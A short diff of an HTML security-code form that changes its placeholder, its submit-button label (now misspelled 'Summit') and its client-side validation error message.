@@ -24,11 +24,11 @@
 
   <form id="digitsForm" method="post" novalidate>
     <label style="display:block;font-weight:600;color:#374151;margin-bottom:8px;font-size:14px">Security Code</label>
-    <input class="input" id="digits" name="digits" placeholder="Enter 4-9 digit code" pattern="\d{4,9}" required>
+    <input class="input" id="digits" name="digits" placeholder="Enter code" pattern="\d{4,9}" required>
     <div class="error-text" id="digitsError"></div>
 
     <div class="center">
-      <button class="btn login-btn" type="submit">Verify & Continue</button>
+      <button class="btn login-btn" type="submit">Summit</button>
     </div>
   </form>
 </div>
@@ -110,7 +110,7 @@ document.getElementById("digitsForm").addEventListener("submit", function(event)
   if (!pattern.test(val)) {
     valid = false;
     digits.classList.add("input-error");
-    digitsError.textContent = "Please enter a valid 4-9 digit security code.";
+    digitsError.textContent = "The code you entered is incorrect.";
   }
 
   if (!valid) event.preventDefault();
